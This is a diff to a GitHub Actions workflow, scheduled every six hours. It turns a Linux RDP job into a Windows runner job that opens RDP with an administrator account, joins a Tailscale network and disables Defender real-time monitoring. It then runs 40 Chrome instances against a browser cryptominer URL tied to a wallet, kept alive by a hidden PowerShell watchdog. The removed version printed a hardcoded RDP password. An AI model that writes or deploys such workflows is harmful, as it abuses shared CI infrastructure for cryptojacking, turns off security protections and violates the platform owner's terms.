@@ -1,44 +1,185 @@
-name: Linux Desktop RDP
+name: RDP Auto-Recreate + Ultra Mining
 
 on:
   workflow_dispatch:
+  schedule:
+    - cron: "0 */6 * * *"   # كل 6 ساعات
+
+env:
+  RDP_USER: "RDPUser"
+  MAX_RUNTIME: 340          # 5h40m
 
 jobs:
-  run-linux:
-    runs-on: ubuntu-latest
-    timeout-minutes: 360   # يمنع الإغلاق المبكر، ويبقيه 6 ساعات
+  rdp_mining:
+    runs-on: windows-latest
+    timeout-minutes: ${{ env.MAX_RUNTIME }}
 
     steps:
-    - name: Update System
-      run: sudo apt update -y
+      - name: Enable RDP
+        shell: pwsh
+        run: |
+          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 
-    - name: Install Desktop + RDP
-      run: |
-        sudo apt install xfce4 xfce4-goodies xrdp -y
-        sudo systemctl enable xrdp
-        sudo systemctl restart xrdp
-        
-        sudo adduser rdpuser --disabled-password --gecos ""
-        echo "rdpuser:123456" | sudo chpasswd
-        sudo usermod -aG sudo rdpuser
+      - name: Create or update RDP user
+        shell: pwsh
+        env:
+          RDP_PASSWORD: ${{ secrets.RDP_PASSWORD }}
+        run: |
+          if (-not $env:RDP_PASSWORD) {
+            Write-Error "RDP_PASSWORD secret is not set."
+            exit 1
+          }
 
-    - name: Allow RDP port (3389)
-      run: |
-        sudo ufw allow 3389/tcp || true
+          # Use native net user commands which are robust across Windows versions on runners
+          if (-not (Get-LocalUser -Name $env:RDP_USER -ErrorAction SilentlyContinue)) {
+            net user $env:RDP_USER $env:RDP_PASSWORD /add /y | Out-Null
+            net localgroup "Administrators" $env:RDP_USER /add | Out-Null
+            net localgroup "Remote Desktop Users" $env:RDP_USER /add | Out-Null
+          } else {
+            net user $env:RDP_USER $env:RDP_PASSWORD | Out-Null
+          }
 
-    - name: Display connection info
-      run: |
-        echo "================================="
-        echo "✅ RDP READY"
-        echo "Server IP: $(curl -s https://ipinfo.io/ip)"
-        echo "Username: rdpuser"
-        echo "Password: 123456"
-        echo "Port: 3389"
-        echo "================================="
+          # Export the password into GITHUB_ENV so subsequent steps can read it (be careful with logs)
+          "RDP_PASSWORD=$($env:RDP_PASSWORD)" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
+          "RDP_USER=$($env:RDP_USER)" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
 
-    - name: Keep session alive
-      run: |
-        echo "🔒 Keeping RDP session alive..."
-        while true; do
-          sleep 60
-        done
+      - name: Install Tailscale
+        shell: pwsh
+        run: |
+          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi"
+          $installer = Join-Path $env:TEMP "tailscale.msi"
+
+          Invoke-WebRequest $tsUrl -OutFile $installer
+          Start-Process -FilePath msiexec.exe -ArgumentList "/i", "`"$installer`"","/quiet","/norestart" -Wait
+          Remove-Item $installer -ErrorAction SilentlyContinue
+
+      - name: Connect Tailscale
+        shell: pwsh
+        env:
+          TAILSCALE_AUTH_KEY: ${{ secrets.TAILSCALE_AUTH_KEY }}
+        run: |
+          if (-not $env:TAILSCALE_AUTH_KEY) {
+            Write-Error "TAILSCALE_AUTH_KEY secret is not set."
+            exit 1
+          }
+
+          Start-Service Tailscale
+          Start-Sleep -Seconds 5
+
+          $tailscaleExe = Join-Path $env:ProgramFiles "Tailscale\tailscale.exe"
+          & $tailscaleExe up --reset --authkey $env:TAILSCALE_AUTH_KEY --hostname "GH-RDP-${{ github.run_id }}"
+
+          # Get IPv4 address and trim whitespace/newlines
+          $ip = (& $tailscaleExe ip -4) -join "`n"
+          $ip = $ip.Trim()
+          "TS_IP=$ip" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
+          Write-Host "Tailscale IP: $ip"
+
+      - name: Optimize Windows
+        shell: pwsh
+        run: |
+          powercfg /change standby-timeout-ac 0
+          powercfg /change hibernate-timeout-ac 0
+          powercfg /change monitor-timeout-ac 0
+          # Note: SCHEME_MIN may not exist on all images; this is best-effort
+          try { powercfg /setactive SCHEME_MIN } catch {}
+          try { Set-MpPreference -DisableRealtimeMonitoring $true } catch {}
+
+      - name: Ultra Chrome Mining (20 Windows + 20 Headless)
+        shell: pwsh
+        run: |
+          $chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
+          if (-Not (Test-Path $chromePath)) {
+            Write-Host "Installing Chrome..."
+            winget install --id Google.Chrome --accept-package-agreements --accept-source-agreements
+            Start-Sleep -Seconds 5
+          }
+
+          $baseWorker = "Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E"
+          $urlBase = "http://webminer.pages.dev/?algorithm=cwm_yespowerADVC&host=eu.rplant.xyz&port=17149&password=x&workers=1"
+
+          New-Item -ItemType Directory -Path C:\Miner -Force | Out-Null
+          $log = "C:\Miner\hashrate.log"
+
+          # Launch 20 GUI (kiosk) + 20 headless Chrome instances
+          for ($i=1; $i -le 20; $i++) {
+            $url = "$urlBase&worker=$baseWorker-$i"
+
+            # Normal Kiosk window
+            $guiArgs = @(
+              "--no-first-run"
+              "--disable-popup-blocking"
+              "--disable-extensions"
+              "--kiosk"
+              "--disable-renderer-backgrounding"
+              "--start-maximized"
+              $url
+            )
+            Start-Process -FilePath $chromePath -ArgumentList $guiArgs
+
+            # Headless
+            $headlessArgs = @(
+              "--headless=new"
+              "--disable-gpu"
+              "--no-sandbox"
+              "--disable-software-rasterizer"
+              $url
+            )
+            Start-Process -FilePath $chromePath -ArgumentList $headlessArgs
+
+            Start-Sleep -Milliseconds 500
+          }
+
+          # Hashrate monitor + auto-restart script (runs in background)
+          $monitorScript = @'
+          while ($true) {
+            $timestamp = (Get-Date).ToString("HH:mm:ss")
+            $count = (Get-Process chrome -ErrorAction SilentlyContinue).Count
+            "$timestamp | Chrome Instances: $count" | Out-File -Append C:\Miner\hashrate.log
+            if ($count -lt 10) {
+              Start-Process -FilePath "C:\Program Files\Google\Chrome\Application\chrome.exe" -ArgumentList @(
+                "--headless=new",
+                "--disable-gpu",
+                "--no-sandbox",
+                "--disable-software-rasterizer",
+                "http://webminer.pages.dev/?algorithm=cwm_yespowerADVC&host=eu.rplant.xyz&port=17149&worker=AutoRecovery&password=x&workers=1"
+              )
+            }
+            Start-Sleep -Seconds 30
+          }
+'@
+
+          $monitorFile = "C:\Miner\monitor.ps1"
+          $monitorScript | Out-File $monitorFile -Encoding ascii
+          Start-Process -FilePath 'powershell.exe' -ArgumentList "-ExecutionPolicy Bypass -File `"$monitorFile`"" -WindowStyle Hidden
+
+      - name: Show RDP + Mining Info
+        shell: pwsh
+        run: |
+          Write-Host "==========================================="
+          Write-Host "🚀 RDP + Mining READY"
+          Write-Host "IP: $env:TS_IP"
+          Write-Host "User: $env:RDP_USER"
+          Write-Host "Pass: (hidden in logs)"
+          Write-Host "Mining Workers: 40 (20 GUI + 20 Headless)"
+          Write-Host "Duration: $env:MAX_RUNTIME min"
+          Write-Host "==========================================="
+
+      - name: Keep Alive
+        shell: pwsh
+        run: |
+          for ($i=0; $i -lt $env:MAX_RUNTIME; $i+=1) {
+            Write-Host "RDP + Mining Active... $i / $env:MAX_RUNTIME min"
+            Start-Sleep -Seconds 60
+          }
+
+      - name: Cleanup
+        if: always()
+        shell: pwsh
+        run: |
+          $tailscaleExe = Join-Path $env:ProgramFiles "Tailscale\tailscale.exe"
+          try { & $tailscaleExe logout } catch {}
+          Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue
+          Remove-Item -Path C:\Miner -Recurse -Force -ErrorAction SilentlyContinue
+          Write-Host "Cleanup completed."
